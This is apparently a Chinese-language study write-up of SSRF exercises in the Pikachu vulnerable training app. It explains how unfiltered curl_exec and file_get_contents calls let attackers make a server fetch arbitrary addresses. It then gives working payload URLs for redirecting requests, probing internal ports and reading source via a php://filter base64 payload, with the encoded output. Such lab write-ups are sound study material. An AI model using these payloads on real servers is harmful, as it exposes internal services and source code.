# SSRF漏洞

## １、漏洞概述

**SSRF\(Server-Side Request Forgery:服务器端请求伪造\)**

其形成的原因大都是由于服务端**提供了从其他服务器应用获取数据的功能**,但又没有对目标地址做严格过滤与限制

导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据

数据流:攻击者-----&gt;服务器----&gt;目标地址

根据后台使用的函数的不同,对应的影响和利用方法又有不一样

```php
PHP中下面函数的使用不当会导致SSRF:
file_get_contents()
fsockopen()
curl_exec()
```

如果一定要通过后台服务器远程去对用户指定\("或者预埋在前端的请求"\)的地址进行资源请求,**则请做好目标地址的过滤**。

## 2、SSRF\(curl\)

打开页面后有一个超链接，点一下。注意到URL里面有一个地址

```text
http://123.56.245.68:83/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/vul/ssrf/ssrf_info/info1.php
```

![image-20210104150456428](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104150456428.png)

从源码可以看到这里的这部分功能是通过curl\_exec\(\)函数执行url传过来参数给的地址，然后将参数返回前端。如果url参数被替换成[http://xxxx或者curl支持的其他协议等都会被curl执行（\*\*curl支持telnet](http://xxxx或者curl支持的其他协议等都会被curl执行（**curl支持telnet) ftp ftps dict file ldap等\*\*）

![image-20210104150537991](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104150537991.png)

那么我们来修改它的地址：

```text
http://123.56.245.68:83/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com
```

![image-20210104150652353](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104150652353.png)

这里就直接把百度的数据显示出来了。

当然，我们也可以测试端口是否开放。（针对内网）

![image-20210104150834612](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104150834612.png)

![image-20210104150851258](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104150851258.png)

## 3、SSRF\(file\_get\_content\)

file\_get\_content\(\)函数是用于将文件的内容读入到一个字符串中的首选方法，逻辑和前面一样。它支持读取远程文件或者本地文件，也支持多种协议。更多的，它还支持php伪协议，我们可以利用伪协议方法读取本地源码。

方案1：直接子修改地址 注意：写的是[http://baidu.com，是http，不是https](http://baidu.com，是http，不是https)

```text
http://123.56.245.68:83/vul/ssrf/ssrf_fgc.php?file=http://www.baidu.com
```

![image-20210104151140534](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210104151140534.png)

方案2：读取页面源码-payload

![image-20210105091208808](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105091208808.png)

```text
http://123.56.245.68:83/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php
```

![image-20210105090330831](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105090330831.png)

```text
PD9waHAKLyoqCiAqIENyZWF0ZWQgYnkgcnVubmVyLmhhbgogKiBUaGVyZSBpcyBub3RoaW5nIG5ldyB1bmRlciB0aGUgc3VuCiAqLwoKCiRTRUxGX1BBR0UgPSBzdWJzdHIoJF9TRVJWRVJbJ1BIUF9TRUxGJ10sc3RycnBvcygkX1NFUlZFUlsnUEhQX1NFTEYnXSwnLycpKzEpOwoKaWYgKCRTRUxGX1BBR0UgPSAic3NyZi5waHAiKXsKICAgICRBQ1RJVkUgPSBhcnJheSgnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnYWN0aXZlIG9wZW4nLCdhY3RpdmUnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnKTsKfQoKJFBJS0FfUk9PVF9ESVIgPSAgIi4uLy4uLyI7CmluY2x1ZGVfb25jZSAkUElLQV9ST09UX0RJUi4naGVhZGVyLnBocCc7CgoKCgoKCj8+CgoKPGRpdiBjbGFzcz0ibWFpbi1jb250ZW50Ij4KICAgIDxkaXYgY2xhc3M9Im1haW4tY29udGVudC1pbm5lciI+CiAgICAgICAgPGRpdiBjbGFzcz0iYnJlYWRjcnVtYnMgYWNlLXNhdmUtc3RhdGUiIGlkPSJicmVhZGNydW1icyI+CiAgICAgICAgICAgIDx1bCBjbGFzcz0iYnJlYWRjcnVtYiI+CiAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImFjZS1pY29uIGZhIGZhLWhvbWUgaG9tZS1pY29uIj48L2k+CiAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0ic3NyZi5waHAiPjwvYT4KICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImFjdGl2ZSI+5qaC6L+wPC9saT4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWNvbnRlbnQiPgoKICAgICAgICAgPGI+U1NSRihTZXJ2ZXItU2lkZSBSZXF1ZXN0IEZvcmdlcnk65pyN5Yqh5Zmo56uv6K+35rGC5Lyq6YCgKTwvYj4KICAgICAgICAgPHA+5YW25b2i5oiQ55qE5Y6f5Zug5aSn6YO95piv55Sx5LqO5pyN5Yqh56uvPGI+5o+Q5L6b5LqG5LuO5YW25LuW5pyN5Yqh5Zmo5bqU55So6I635Y+W5pWw5o2u55qE5Yqf6IO9PC9iPizkvYblj4jmsqHmnInlr7nnm67moIflnLDlnYDlgZrkuKXmoLzov4fmu6TkuI7pmZDliLY8L3A+CiAgICAgICAgICAgIOWvvOiHtOaUu+WHu+iAheWPr+S7peS8oOWFpeS7u+aEj+eahOWcsOWdgOadpeiuqeWQjuerr+acjeWKoeWZqOWvueWFtuWPkei1t+ivt+axgizlubbov5Tlm57lr7nor6Xnm67moIflnLDlnYDor7fmsYLnmoTmlbDmja48YnI+CiAgICAgICAgICAgIDxicj4KICAgICAgICAgICAg5pWw5o2u5rWBOuaUu+WHu+iAhS0tLS0tPuacjeWKoeWZqC0tLS0+55uu5qCH5Zyw5Z2APGJyPgogICAgICAgICAgICA8YnI+CiAgICAgICAgICAgIOagueaNruWQjuWPsOS9v+eUqOeahOWHveaVsOeahOS4jeWQjCzlr7nlupTnmoTlvbHlk43lkozliKnnlKjmlrnms5Xlj4jmnInkuI3kuIDmoLcKICAgICAgICAgICAgPHByZSBzdHlsZT0id2lkdGg6IDUwMHB4OyI+ClBIUOS4reS4i+mdouWHveaVsOeahOS9v+eUqOS4jeW9k+S8muWvvOiHtFNTUkY6CmZpbGVfZ2V0X2NvbnRlbnRzKCkKZnNvY2tvcGVuKCkKY3VybF9leGVjKCkKICAgICAgICAgICAgPC9wcmU+PGJyPgogICAgICAgICAgICDlpoLmnpzkuIDlrpropoHpgJrov4flkI7lj7DmnI3liqHlmajov5znqIvljrvlr7nnlKjmiLfmjIflrpooIuaIluiAhemihOWfi+WcqOWJjeerr+eahOivt+axgiIp55qE5Zyw5Z2A6L+b6KGM6LWE5rqQ6K+35rGCLDxiPuWImeivt+WBmuWlveebruagh+WcsOWdgOeahOi/h+a7pDwvYj7jgIIKPGJyPgogICAgICAgICAgICA8YnI+CgogICAgICAgICAgICDkvaDlj6/ku6XmoLnmja4iU1NSRiLph4zpnaLnmoTpobnnm67mnaXmkJ7mh4Lpl67popjnmoTljp/lm6AKCiAgICAgICAgPC9kaXY+PCEtLSAvLnBhZ2UtY29udGVudCAtLT4KICAgIDwvZGl2Pgo8L2Rpdj48IS0tIC8ubWFpbi1jb250ZW50IC0tPgoKCgo8P3BocAppbmNsdWRlX29uY2UgJFBJS0FfUk9PVF9ESVIgLiAnZm9vdGVyLnBocCc7Cgo/Pgo=
```

Base64解码

```text
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */
```

![image-20210105090603267](https://gitee.com/Harveysn0w/win-note_img/raw/master/image-20210105090603267.png)

